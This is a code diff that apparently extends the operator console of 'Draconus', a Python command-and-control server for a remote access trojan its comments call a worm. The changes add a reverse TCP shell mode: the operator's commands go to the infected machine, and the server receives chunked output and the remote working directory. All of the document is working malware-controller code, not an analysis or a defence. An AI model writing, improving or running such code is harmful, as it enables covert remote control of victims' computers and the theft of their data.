@@ -25,15 +25,21 @@ TYPE_RAT = 'RAT'
 # message to disconnect
 MSG_DISC = 'MSG_DISC'
 
-# message uses to send response (it is OK)
-MSG_OK = 'MSG_OK'
+# prepare to send Message
+TYPE_MSG = 'TYPE_MSG'
+
+# message to start shell
+SHELL_START = 'SHELL START'
 
 # message to exit the shell
 SHELL_EXIT = 'EXIT'
 
 class Msg:
     def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
-        self.pmsg = msg
+        if msg == '':
+            self.pmsg = '0'
+        else:
+            self.pmsg = msg
         self.formats = formats
         if len(msg) > raw_len:
             self.raw_len = len(msg)
@@ -77,6 +83,7 @@ class Draconus:
         print('*********************************************************')
         print(f'[DRACONUS] Server listening on {SERVER}')
         while True:
+            self.synergy = None
             print('[DRACONUS] ------------------------------------------------')
             print('[DRACONUS] Waiting for connection')
             self.conn, self.addr = self.server.accept()
@@ -87,7 +94,8 @@ class Draconus:
                 print(f'[DRACONUS] Disconnect {self.addr[0]} .... ')
                 self.conn.close()
                 continue
-
+            
+      
             self.handle_RAT()
 
         self.conn.close()
@@ -131,25 +139,22 @@ class Draconus:
             pass
 
 
-    # recive a output message from worm and send response (1 bytes). Result of send command.
-    # default length is 4kb (4096)
-
     def recive_output(self):
-        output = None
-        try:
-            output = self.conn.recv(OUT_LEN)
-        except Exception as e:
-            print('[DRACONUS] Error when recive output ')
-            return None
-        if output:
-            output = output.decode(FORMAT).rstrip(' ')
-
-        try:
-            self.conn.send(RAW_NoE)
-        except Exception as e:
-            print('[DRACONUS] Error when send response ')
-
+        len_out = self.recive_pocket()
+        length = int(float(len_out))
+        output = b''
+        while len(output) < length:
+            chunk = self.conn.recv(length)
+            if not chunk:
+                break
+            output += chunk
+        
+        output = output.decode(FORMAT)
         return output
+        
+            
+
+
 
     
     # Identification of worm type
@@ -165,19 +170,43 @@ class Draconus:
             print(f'[DRACONUS] This is {self.synergy} !!! ')
             return True
 
+    def show_output(self, output):
+        print(f'[DRACONUS] ************** New Message From {self.synergy} ****************')
+        print(f'[{self.synergy}] {output} ')
+        print('[DRACONUS] **************************************************************')
+        return output
 
     def handle_RAT(self):
         command = None
-        while command != SHELL_EXIT:
+        while command != MSG_DISC:
+            print(f'[DRACONUS] ** Put: {SHELL_START} to start Reverse TCP SHELL')
+            print(f'[DRACONUS] ** Put: {MSG_DISC} to Disconnect {self.synergy} ')
+            print('-----------------------------------------------------------------')
             print(f'[DRACONUS] Put order to {self.synergy} [{self.addr[0]}]')
             print('[DRACONUS] << ', end='')
             command = input()
             
             self.send_pocket(str(command))
-            output = self.recive_output()
-            print(f'[DRACONUS] ********************* NEW MESSAGE from {self.synergy} ******************')
-            print(f'[{self.synergy}]\n{output}')
-            print('[DRACONUS] *************************************************************')
+            response = self.recive_pocket()
+            self.show_output(response)
+            if command == SHELL_START:
+                com = None
+                while com != SHELL_EXIT:
+                    cwd = self.recive_pocket()
+                    print(f'[{self.synergy} CWD] {cwd}')
+                    print(f'[{self.synergy} SHELL] << ', end='')
+                    com = input()
+                    self.send_pocket(com)
+                    rec = self.recive_output()
+                    self.show_output(rec)
+
+
+            
+
+        print(f'[DRACONUS] Disconnect {self.synergy} - {self.addr[0]} ')
+                    
+
+
 
 
 #### START
